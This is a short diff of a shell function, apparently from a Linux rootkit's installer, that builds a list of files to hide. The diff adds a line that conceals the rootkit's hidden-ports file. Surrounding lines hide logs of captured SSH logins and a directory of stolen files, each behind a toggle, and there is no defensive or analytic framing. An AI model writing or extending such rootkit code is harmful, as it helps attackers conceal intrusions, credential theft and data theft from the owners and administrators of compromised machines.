@@ -11,6 +11,7 @@ hide_rootkitfiles(){  # $1 = home/install directory
 
     # only hide specific paths if their respective toggles are enabled
     [ -f $homedir/bd_bashrc ] && hide_files+=($homedir/.profile)
+    [ `toggle_enabled HIDE_PORTS` == "true" ] && hide_files+=($HIDEPORTS)
     [ `toggle_enabled LOG_SSH` == "true" ] && hide_files+=($SSH_LOGS)         # $SSH_LOGS and $INTEREST_DIR
     [ `toggle_enabled FILE_STEAL` == "true" ] && hide_files+=($INTEREST_DIR)  # are both files in totally
                                                                               # random locations.
